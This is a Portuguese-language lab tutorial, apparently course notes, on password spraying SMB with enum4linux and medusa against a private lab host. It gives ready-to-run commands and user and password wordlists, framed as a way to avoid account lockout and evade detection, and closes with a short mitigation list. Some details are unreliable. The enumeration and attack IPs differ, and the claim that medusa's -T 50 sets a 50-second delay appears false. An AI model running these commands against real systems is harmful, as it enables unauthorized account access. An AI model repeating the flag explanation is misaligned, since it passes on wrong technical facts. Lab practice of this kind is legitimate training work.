# 03 — Password Spraying em SMB/NetBIOS

A técnica de **spray** (papel de priminho): enviar um conjunto de senhas a vários
usuários — ou vice-versa — com atraso entre as tentativas para não bloquear
contas e ficar "imune" à detecção.

## 3.1 Coleta de informações

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

- `-a`: executa todas as opções de `enum4linux`;
- `tee`: salva a saída em `enum4_output.txt` e mostra no terminal.

### Visualizar o arquivo

```bash
less enum4_output.txt
```

> ⚠️ **Correção:** o `tee` gerou `enum4_output.txt` (com sublinhado). O `less`
> original usava `enum4output.txt` (sem sublinhado) — o correto é `enum4_output.txt`.

## 3.2 Criação das wordlists

Usuários:

```bash
echo -e "usr\nmsfadmin\nservice" > smb_users.txt
```

- `-e`: interpreta `\n` como nova linha;
- `>`: redireciona a saída para `smb_users.txt`.

Senhas:

```bash
echo -e "password\n123456\nWelcome123\nmsfadmin" > senham.txt
```

> ⚠️ **Correção:** o comando original terminava no meio das aspas. Com o fechamento
> `" > senham.txt`, o shell grava a lista corretamente.

## 3.3 Password spraying no serviço SMBNT

```bash
medusa -h 192.168.56.191 -U smb_users.txt -P senham.txt -M smbnt -t 2 -T 50
```

| Flag | Significado |
|------|-------------|
| `-h` | Host alvo |
| `-U` | Lista de usuários |
| `-P` | Lista de senhas |
| `-M smbnt` | Módulo SMBNT do Medusa |
| `-t 2` | 2 threads |
| `-T 50` | 50s de intervalo entre tentativas — essencial para não bloquear contas |

## Resultado

- Se o par usuário×senha existir, o Medusa revela acesso;
- O atraso `-T 50` evita bloqueio automático e reduz a chance de detecção.

## Mitigação

- Senhas fortes e políticas de complexidade;
- Bloqueio de conta após N falhas;
- Sistema de detecção de padrões de spraying;
- Monitoramento de conexões SMB/NetBIOS.
